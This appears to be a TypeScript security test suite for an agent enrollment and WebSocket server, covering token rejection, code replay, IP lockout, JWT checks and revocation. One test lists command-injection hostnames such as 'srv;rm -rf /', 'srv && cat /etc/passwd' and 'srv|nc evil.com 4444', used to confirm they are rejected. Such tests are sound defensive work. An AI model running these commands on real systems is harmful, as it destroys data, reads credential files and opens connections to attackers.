import { test, expect } from './helpers';
import WebSocket from 'ws';
import { randomUUID } from 'node:crypto';

test.describe('security attacks', () => {
  test('rejects WebSocket connection with invalid token', async () => {
    const ws = new WebSocket('ws://localhost:3000/api/agent/ws?token=invalid-token-xxx');
    await expect(new Promise((resolve) => {
      ws.on('close', (code) => resolve(code));
      ws.on('error', () => resolve('error'));
    })).resolves.toMatch(/4001|error/);
  });

  test('rejects WebSocket connection without token', async () => {
    const ws = new WebSocket('ws://localhost:3000/api/agent/ws');
    await expect(new Promise((resolve) => {
      ws.on('close', resolve);
      ws.on('error', () => resolve('error'));
    })).resolves.toBeTruthy();
  });

  test('enrollment code cannot be replayed', async ({
    adminLogin,
    createCustomer,
    issueEnrollmentCode,
  }) => {
    await adminLogin();
    const customerId = await createCustomer(`安全测试-${randomUUID().slice(0, 8)}`);
    const code = await issueEnrollmentCode(customerId);

    // 第一次使用成功
    const res1 = await fetch('http://localhost:3000/api/agent/enroll', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-forwarded-for': '10.0.0.1' },
      body: JSON.stringify({ enrollmentCode: code, hostname: 'sec-srv-1' }),
    });
    expect(res1.status).toBe(200);

    // 第二次使用同一个 code 必须失败
    const res2 = await fetch('http://localhost:3000/api/agent/enroll', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-forwarded-for': '10.0.0.2' },
      body: JSON.stringify({ enrollmentCode: code, hostname: 'sec-srv-2' }),
    });
    expect(res2.status).toBe(401);
  });

  test('IP gets locked after 3 failed enrollment attempts', async () => {
    const ip = `20.20.20.${Math.floor(Math.random() * 254) + 1}`;
    for (let i = 0; i < 3; i++) {
      await fetch('http://localhost:3000/api/agent/enroll', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-forwarded-for': ip },
        body: JSON.stringify({ enrollmentCode: 'BAD', hostname: 'bad-srv' }),
      });
    }
    const res = await fetch('http://localhost:3000/api/agent/enroll', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-forwarded-for': ip },
      body: JSON.stringify({ enrollmentCode: 'BAD', hostname: 'bad-srv' }),
    });
    expect(res.status).toBe(429);
    const body = await res.json();
    expect(body.error).toMatch(/lock|too many/i);
  });

  test('hostname with shell metacharacters is rejected', async ({
    adminLogin,
    createCustomer,
    issueEnrollmentCode,
  }) => {
    await adminLogin();
    const customerId = await createCustomer(`注入测试-${randomUUID().slice(0, 8)}`);
    const code = await issueEnrollmentCode(customerId);

    const maliciousHostnames = [
      'srv;rm -rf /',
      'srv && cat /etc/passwd',
      'srv`whoami`',
      'srv$(id)',
      'srv|nc evil.com 4444',
    ];
    for (const hostname of maliciousHostnames) {
      const res = await fetch('http://localhost:3000/api/agent/enroll', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-forwarded-for': '30.30.30.30' },
        body: JSON.stringify({ enrollmentCode: code, hostname }),
      });
      expect(res.status).toBe(400);
    }
  });

  test('admin endpoint rejects unauthenticated request', async () => {
    const res = await fetch('http://localhost:3000/api/admin/customers');
    expect(res.status).toBe(401);
  });

  test('admin endpoint rejects expired/invalid JWT cookie', async () => {
    const res = await fetch('http://localhost:3000/api/admin/customers', {
      headers: { cookie: 'central_admin_session=invalid.jwt.token' },
    });
    expect(res.status).toBe(401);
  });

  test('revoked token cannot reconnect', async ({
    adminLogin,
    createCustomer,
    issueEnrollmentCode,
    simulateAgent,
  }) => {
    await adminLogin();
    const customerId = await createCustomer(`吊销测试-${randomUUID().slice(0, 8)}`);
    const code = await issueEnrollmentCode(customerId);

    const enrollRes = await fetch('http://localhost:3000/api/agent/enroll', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-forwarded-for': '40.40.40.40' },
      body: JSON.stringify({ enrollmentCode: code, hostname: 'revoke-srv' }),
    });
    const { serverId, agentToken } = await enrollRes.json();

    // 先连接成功
    const agent = await simulateAgent(agentToken);
    agent.send({ type: 'agent:register', serverId, agentVersion: '1.0', hostname: 'revoke-srv', dockerVersion: '24.0' });
    await agent.waitForMessage('agent:welcome');
    agent.close();

    // revoke
    const revokeRes = await fetch(`http://localhost:3000/api/admin/servers/${serverId}/token`, { method: 'POST' });
    expect(revokeRes.status).toBe(200);

    // 重连应被拒绝
    const ws = new WebSocket(`ws://localhost:3000/api/agent/ws?token=${agentToken}`);
    const result = await new Promise((resolve) => {
      ws.on('close', (code) => resolve(code));
      ws.on('error', () => resolve('error'));
    });
    expect(result).toMatch(/4001|error/);
  });
});
